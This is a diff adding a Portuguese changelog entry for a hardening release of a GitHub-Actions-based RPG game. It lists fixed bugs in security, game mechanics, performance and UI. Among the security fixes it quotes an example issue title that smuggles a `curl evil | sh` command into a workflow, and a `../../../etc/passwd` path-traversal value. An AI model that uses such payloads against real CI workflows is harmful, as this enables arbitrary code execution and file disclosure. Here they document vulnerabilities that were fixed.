@@ -5,6 +5,97 @@ Formato baseado em [Keep a Changelog](https://keepachangelog.com/pt-BR/1.0.0/).
 
 ---
 
+## [3.1.0-hardening] — 2026-07-28 — Correções de segurança, persistência e mecânicas
+
+Origem: revisão cirúrgica do repositório (segurança, desempenho, escalabilidade,
+funcionalidade, UI/UX). Plano em [`docs/PLAN-v3.1-hardening.md`](docs/PLAN-v3.1-hardening.md).
+
+### 🔴 Corrigido — crítico
+
+- **O pipeline nunca commitou um turno.** `git add` com um pathspec inexistente
+  (`rpg/raids.json`, que só nasce na primeira raid) morre com exit 128 sem stage-ar nada;
+  o `|| true` mascarava, `git diff --staged --quiet` passava e o commit era pulado. Zero
+  commits de "Aethoria Bot" no histórico — todo o estado de jogo do repo veio de commit
+  manual local.
+- **Command injection no workflow.** O título da issue era interpolado dentro de um bloco
+  `run:`, então um título como `rpg:x"; curl evil | sh; #` executava código arbitrário
+  num runner com `contents: write`. Agora passa por `env:` e é lido como `"$VAR"`.
+- **Exploit da masmorra.** O mini-boss da sala 10 é `is_boss=True`, e `resolve_kill`
+  gravava `bosses_defeated[terreno_atual]`: numa masmorra em Kragdor isso entregava a
+  relíquia de Drakar e a montaria dracônica de graça.
+- **`rpg:reiniciar` não reiniciava.** `action_reset` chamava `load_player()`, que relê o
+  arquivo do disco — o save antigo voltava inteiro.
+
+### 🛠️ Corrigido — mecânicas anunciadas que não funcionavam
+
+- **14 nós defensivos eram placebo**: `def_flat` era agregado e nunca aplicado ao dano.
+- **Atordoamento e queima só valiam para o Mago**: o gate era `if cls_key == "mago"`, o
+  que deixava Fender Crânios (bárbaro), Prisão Óssea (necromante) e Raio Aniquilador
+  (bruxo) inertes.
+- **`regen`** ("+X HP por turno vivo") só era aplicado ao matar um inimigo.
+- **`free_escape`** ("Fuga sempre funciona") nunca era consultado.
+- **Relíquia de Vel'Moran** ("imune a 1 morte por sessão") não tinha implementação.
+- **Relíquia de Drakar** não concedia os "+12 ATK" prometidos.
+- **Rumor de taverna** "+15 ATK contra ele" era gravado e nunca lido.
+- **`inventory`** nunca era preenchido e `RECIPES[...]["result"]` era ignorado: craftar
+  Poção Superior (+120 HP) só somava +1 no contador genérico.
+- **Poção Grande (15g) curava o mesmo que a Menor (8g)**.
+- **Faixa de preço de -40% reputação** era inalcançável (ordem dos testes invertida).
+- **Descansar e teleportar funcionavam em combate** (checavam a chave legada
+  `active_monster`, singular).
+- **PvP nunca achava ninguém com maiúscula no login**: o título inteiro levava `.lower()`,
+  então `rpg:desafiar:xXYoungMoreXx` procurava `xxyoungmorexx.json`.
+- **Level-up inflava os máximos**: `max_hp += 18 + sk["hp_max"]` ressomava o bônus da
+  árvore a cada nível e `sb()` semeava `mana_max=30`, dando +40 de mana por nível sem
+  skill nenhuma. Agora os máximos são derivados de classe+nível+prestígio+árvore.
+- **`check_lu` subia só um nível por chamada** e não era idempotente.
+
+### 🔒 Segurança
+
+- Raid só pode ser inicializada a partir de issue aberta pelo bot: antes bastava o título
+  casar com um World Boss para qualquer pessoa farmar recompensa.
+- Pool de recompensa de raid agora é **dividido** entre participantes (cada um recebia o
+  pool inteiro).
+- Texto de jogador é escapado antes de entrar no README (`rpg:mensagem:` e o eco de ação
+  inválida permitiam injetar link/HTML no perfil público).
+- Login validado contra a regra do GitHub: `rpg:desafiar:../../../etc/passwd` montava
+  caminho fora de `rpg/players/`.
+- `urlopen` sem timeout em 3 chamadas (travavam até o limite de 5 min do job).
+
+### ⚡ Desempenho e escalabilidade
+
+- `cache: pip` sem arquivo de dependência removido (fazia o step do `setup-python`
+  falhar); o step inteiro saiu, já que o projeto é stdlib-only.
+- `fetch-depth: 0` → `1`.
+- `concurrency` group compartilhado entre `rpg.yml` e `update-projects.yml`, que escrevem
+  o mesmo README; push com retry e rebase.
+- Dia/noite e eventos mundiais agora derivam do **tempo** (UTC), não do contador global de
+  turnos — com muitos jogadores ativos o dia virava noite em minutos.
+- `raids.json` lido do disco uma vez por processo (eram 4 leituras por turno).
+- `npc_memory[npc]["met"]` limitado (crescia sem limite dentro do `state.json`).
+
+### 🎨 UI/UX e acessibilidade
+
+- Log da jogada movido para o topo do bloco (estava abaixo de 8 tabelas).
+- Ações impossíveis no contexto atual não são mais exibidas como disponíveis.
+- Legenda do mapa completa (listava 14 dos 25 locais) e mapa em tabela, que alinha.
+- Nós de skill desbloqueáveis viraram links clicáveis (antes exigiam decorar o ID).
+- Tabelas longas em `<details>`; efeito de preço do evento mostrava "+0%" sempre.
+- Tabela de raid mostrava o slug interno ("Tita de Gelo") no lugar do nome de exibição.
+- `<img>` dos projetos em destaque ganhou `alt`.
+- Falha do engine agora comenta na issue em vez de sumir com o turno em silêncio.
+
+### 🧪 Qualidade
+
+- `tests/test_engine.py`: **52 testes** em `unittest` (stdlib, zero dependências), com um
+  teste de regressão por bug acima, cobertura de todas as ações despacháveis e um teste
+  ponta a ponta por subprocess. `python3 -m unittest discover -s tests`.
+- `migrate_player()` normaliza saves antigos e aplica clamp de sanidade.
+- Higiene de dados: saves de teste removidos do perfil público, `max_hp: 10035` no nível 5
+  corrigido para 202, crédito de chefão inválido e a conquista dele revogados.
+
+---
+
 ## [3.4.0] — 2026 — Dungeons Cooperativas (Raids)
 
 ### ✨ Adicionado
